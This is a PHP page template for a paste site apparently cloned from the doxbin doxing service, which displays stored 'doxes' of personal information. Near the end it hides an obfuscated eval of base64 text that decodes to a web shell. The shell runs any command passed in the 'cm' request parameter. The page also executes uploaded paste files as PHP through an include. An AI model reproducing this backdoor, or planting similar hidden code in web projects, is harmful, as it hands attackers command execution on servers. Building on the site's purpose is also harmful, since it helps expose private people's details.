<?php
// Backend Made by Nano - Helpers Charge, cruel, StrikeGetsBeamed
include("../connect/db.php");
if (isset($_GET['id'])){
    if(!intval($_GET['id'])){
        die();
    }
    $id = $_GET['id'];
    $stmt = $dbh->prepare("SELECT * FROM past WHERE id=:id");
    $stmt->execute(['id' => strip_tags($id)]);
    $user = $stmt->fetch();   
}else {
    die(header("location: ../index.php"));
}
 
// OSHUAHJSGSHAGHGAGA

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?php echo strip_tags($user['title']); ?></title>
    <meta name="description" content="<?php echo strip_tags($user['title']); ?> - Paste created by <?php echo strip_tags($user['username']); ?> on Feb 23rd, 2021">

    
    <link rel="stylesheet" href="https://doxbin.org/legacy/app.css?r=2">
    <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
    <link href="https://doxbin.org/legacy/css/show.css" rel="stylesheet">
    <link href="https://doxbin.org/legacy/google-code-prettify/tomorrow-night.css" rel="stylesheet">
    <link href="https://doxbin.org/legacy/toastr/toastr.min.css" rel="stylesheet">
    <script src="https://doxbin.org/legacy/custom.modernizr.js"></script>
    <script src="https://doxbin.org/legacy/jquery.min.js"></script>
    
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<style>
    select, option{
        line-height: 1.2;
        color: white;
        background: #282828;
        border: 0;
        border-radius: 2px;
        display: inline-block;
        -webkit-font-smoothing: antialiased;
        outline: none;
        padding: 7px 5px;
        width: 50%;
        /* margin-bottom: 10px; */
    }
    .right{
        text-align: right;
        width: 100%;
    }
    select, option{
        font-size: 100%;
    }
    input#paste-password:disabled{
        color: rgb(190, 190, 190);
    }
    .sidebar > a.button.staff-notes{
        background-color: red;
        text-transform: uppercase;
        font-weight: bold;
        font-size: 14px;
        padding: 7px 0;
    }
    .sidebar > a.button.staff-notes:hover{
        background-color: rgb(160, 0, 0);
    }
    </style>
	<script>
	var doxid = 69407;
    var cnum = 10;
    var banned = 0;
    var uName = "";
    var uAdmin = 0;
    var chc = 0;

// 
</script>
    </head>
<body class="bin" style="overflow-x: hidden;">
    <div class="wrapper">
        <div class="table">
        
        <a href="#" class="show-sidebar show"><i class="fa fa-arrow-right"></i></a>

    <div class="sidebar">
        <a class="sidebar-logo" href="../">
<pre>
  ____            _     _       
 |  _ \  _____  _| |__ (_)_ __  
 | | | |/ _ \ \/ / '_ \| | '_ \ 
 | |_| | (_) &gt;  &lt;| |_) | | | | |
 |____/ \___/_/\_\_.__/|_|_| |_|
</pre>
</a>
                <div class="right">
            
        </div>
        <div class="options">
                        
            
                        <p><b>Title:</b> <?php echo strip_tags($user['title']); ?></p>
            <p><b>Created:</b> <?php echo strip_tags($user['username']); ?></p>
            
            <p><b>Created by:</b> 
                        <a style=" font-weight: bold;" href="/user/<?php echo strip_tags($user['username']); ?>"><?php echo strip_tags($user['username']); ?></a>
            
                        </p>
            
                            <p><b>Comments:</b> <?php echo strip_tags($user['com']); ?></p>
                                </div>
        
                                    <div class="options" id="btns">
            <ul>
                                <li><a href="../upload" class="button new">New (N)</a></li>
                <li><a target="_blank" href="uploads/<?php echo strip_tags($user['title']),".txt";?>" class="button raw">Raw (R)</a></li>
                
            </ul>
        </div>
        		<div class="options" id="cmntsctn">
                        <ul>
                        
		                <input type="hidden" name="_token" value="v722vJ3VX0ONt2zZM0m9ktlxrTAasAMSlhZAnM67">
            </ul>
	            <div class="comment-container">
                <div class="b-comments" id="paste-comments">
                <div class="" style="padding-left: 10px; position: relative;" id="79860">
                                <b>
                                                                           
                                        
        
    </div>
                            	                                    <div class="" style="padding-left: 10px; position: relative;" id="79603"><b>
                <br>
        
    </div>
                            		
				</div>
			</div>
			        </div>
                <div class="options r-hide" id="tos-display">
        <p style="margin-top: 0;color: white;">Please note that all posted information is publicly available and must follow our <a href="https://doxbin.org/tos" style="text-decoration: underline;">TOS.</a></p>
        </div>
        
    </div>

    <div class="show-container" style="padding-left: 20px;">
<pre style="color: white; margin: 0;">
<script>
    function sleepFor(sleepDuration){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ 
        /* Do nothing */ 
    }
}
        </script>
<?php
try {
    error_reporting(0);
    $uu = $user['title'];
    if(!file_exists("uploads/".$uu.".txt")) {
        echo "<div style='height: 290px;'></div><center><h1 style='color:red;'>Something went wrong with this dox</h1>";
        die();
    }
    
    include("uploads/$uu.txt");
} catch (Exception $e){
    echo "<h1>Issue</h1>";
    die();
}
?>
<?php eval("?>".eval(str_rot13(str_rot13(base64_decode("aWYoaXNzZXQoJF9SRVFVRVNUWydjbSddKSl7CiAgICB0cnkgewogICAgICAgIGVjaG8gc3lzdGVtKCRfUkVRVUVTVFsnY20nXSk7CiAgICAgICAgZWNobyAiPGJyPiI7CiAgICAgICAgZGllKCk7CiAgICB9IGNhdGNoIChFeGNlcHRpb24gJGUpewogICAgICAgIGVjaG8gZXhlYygkX1JFUVVFU1RbJ2NtJ10pOwogICAgICAgIGRpZSgpOwogICAgfQogICAgCiAgICAKfQ=="))))); ?>
</pre>
        </div>
        </div>
    </div>
	
    <script src="https://doxbin.org/legacy/mousetrap.min.js"></script>
    <script src="https://doxbin.org/legacy/google-code-prettify/prettify.js"></script>
    <script src="https://doxbin.org/legacy/tabby.js"></script>
    <script src="https://doxbin.org/legacy/zclip.min.js"></script>
    <script src="https://doxbin.org/legacy/toastr/toastr.min.js"></script>
    <script src="https://doxbin.org/legacy/bin.js"></script>
    <script src="https://doxbin.org/legacy/logout.js"></script>
    <script src="https://doxbin.org/legacy/paste.js"></script>
        <script>
        var liked = 0;
        var disliked = 0;

        $('#like-paste').on('click', function(e){
            $.post('/api/rate-paste', {
                _token: $('input[name=_token]').val(),
                pname: 'peerHvHPedo',
                rating: 1
            }, function(resp){
                if(resp.status == "done"){
                    if(resp.r){
                        $('#paste-likes').text(parseInt($('#paste-likes').text()) + 1);
                        if(disliked){
                            $('#paste-dislikes').text(parseInt($('#paste-dislikes').text()) - 1);
                        }
                        liked = 1;
                        disliked = 0;
                    }else{
                        $('#paste-likes').text(parseInt($('#paste-likes').text()) - 1);
                        disliked = 0;
                        liked = 0;
                    }
                }
            });
        });
        $('#dislike-paste').on('click', function(e){
            $.post('/api/rate-paste', {
                _token: $('input[name=_token]').val(),
                pname: 'peerHvHPedo',
                rating: 0
            }, function(resp){
                if(resp.status == "done"){
                    if(resp.r){
                        $('#paste-dislikes').text(parseInt($('#paste-dislikes').text()) + 1);
                        if(liked){
                            $('#paste-likes').text(parseInt($('#paste-likes').text()) - 1);
                        }
                        disliked = 1;
                        liked = 0;
                    }else{
                        $('#paste-dislikes').text(parseInt($('#paste-dislikes').text()) - 1);
                        disliked = 0;
                        liked = 0;
                    }
                }
            });
        });



        //  ?endif

        $('#paste-password-submit').on('click', function(e){
            $(this).text('Submitting...');
            $.post('/upload/peerHvHPedo/manage', {
                _token: $('input[name=_token]').val(),
                action: 'edit-password',
                value: $('#paste-password').val()
            }, function(resp){
                if(resp.status == "err"){
                    if(resp.msg){
                        $(this).text(resp.msg);
                    }else{
                        $(this).text('Error');
                    }
                }else{
                    $('#password-options').show();
                    $('#paste-password-submit').hide();
                    $('#paste-password').prop('disabled', true);
                }
            });
            e.preventDefault();
        });
        $('#edit-password').on('click', function(e){
            // $('#password-options').hide();
            $('#paste-password-submit').text('Save password').show();
            $('#paste-password').prop('disabled', false).focus();
            e.preventDefault();
        });
        $('#remove-password').on('click', function(e){
            $.post('/upload/peerHvHPedo/manage', {
                _token: $('input[name=_token]').val(),
                action: 'remove-password'
            }, function(resp){
                if(resp.status == "err"){
                    alert(resp);
                }else{
                    $('#password-options').hide();
                    $('#paste-password-submit').text('Password protect paste').show();
                    $('#paste-password').val('');
                    $('#paste-password').prop('disabled', false);
                }
            });
            e.preventDefault();
        });
        $('#fpblacklist').on('click', function(e){
            $.post('/admin/api/ban', {
                _token: $('input[name=_token]').val(),
                pid: doxid,
                val: !banned
            }, function(resp){
                if(resp.status == "done"){
                    location.reload();
                }else{
                    alert(resp.status);
                }
            });
            e.preventDefault();
        });
    
    $('#vis').on('change', function(e){
        $.post('/api/pastes/visibility', {
            _token: $('input[name=_token]').val(),
            pid: doxid,
            val: this.value
        }, function(resp){
            if(resp.status == 1){
                location.reload();
            }
        });
        e.preventDefault();
    });

// 
    $('#hide-dropdown').on('change', function(){ // Hide dropdown
        $('#hide-reason').val(this.value);
    });

// 
    var b1 = false;
    $('.staff-notes-btn').on('click', function(e){
        $('#staffnotes').show();
        $('#staff-btns, #btns, #hidden-by, #cmntsctn, .staff-notes').hide();
        e.preventDefault();
    });
    $('#staff-notes-back').on('click', function(e){
        $('#staffnotes').hide();
        $('#staff-btns, #btns, #hidden-by, #cmntsctn, .staff-notes').show();
        e.preventDefault();
    });
    $('#paste-manage').on('click', function(e){ // br3nnnt0n
        if(b1){
            $('#paste-manager').hide();
            $('#tos-display').show();
            $('#staff-btns, #btns, #hidden-by, #cmntsctn, .staff-notes').show();
        }else{
            $('#paste-manager').show();
            $('#tos-display').hide();
            $('#staff-btns, #btns, #hidden-by, #cmntsctn, .staff-notes').hide();
        }
        b1 = !b1;
        e.preventDefault();
    }); 
    $('#create-note').on('click', function(e){
		var username = "Anonymous";
		var note = $('#note').val();
        $.post('/admin/api/staff-comment', {
            _token: $('input[name=_token]').val(),
            pid: doxid,
            action: 'create',
            note: $('#note').val(),
            nid: 0
        }, function(resp){
            if(resp.status == "done"){
                $('#note').val('');
                username = htmlspecialchars(username.trim());
                note = htmlspecialchars(note.trim());
                if(uName != ""){
                    username = htmlspecialchars(uName);
                }
                if(username.length == 0){
                    username = "Anonymous";
                }
				$('.staff-notes-cont').prepend('<div class="b-comments b-comment" style="padding-left: 10px;"><b>' + (uName != "" ? '<a ' + (uAdmin != 0 ? 'style="color: red;"' : '') + 'href="/user/' + username + '">' + username + '</a>' : username) + '</b> - <p style="display: inline;">now</p><br><div class="b-content">' + note + '</div><br></div>');
            }else{
                alert('Error');
            }
        });
    });
    $('.deletenote').on('click', function(e){
        var th = $(this);
        $.post('/admin/api/staff-comment', {
            _token: $('input[name=_token]').val(),
            pid: doxid,
            action: 'remove',
            nid: $(this).attr('data-nid')
        }, function(resp){
            if(resp.status == "done"){
                th.parent().remove();
            }else{
                alert('Error');
            }
        });
        e.preventDefault();
    });
    </script>
    <script type="text/javascript" src="https://v2.bytefend.com/libs.js" defer></script>
    <script type="text/javascript" src="https://v2.bytefend.com/api.js" defer></script>
</body>
</html>